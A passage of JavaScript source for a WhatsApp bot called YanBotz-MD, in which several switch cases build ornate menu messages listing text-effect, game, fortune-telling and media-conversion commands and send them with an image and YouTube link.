┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'photooxymenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃ ݊⃟̥⃝̇݊⃟╾•PHOTOOXY_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'ephotomenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•EPHOTO_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'funmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃    ݊⃟̥⃝̇݊⃟╾•FUN_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'primbonmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•PRIMBON_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'convertmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•CONVERT_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'mainmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
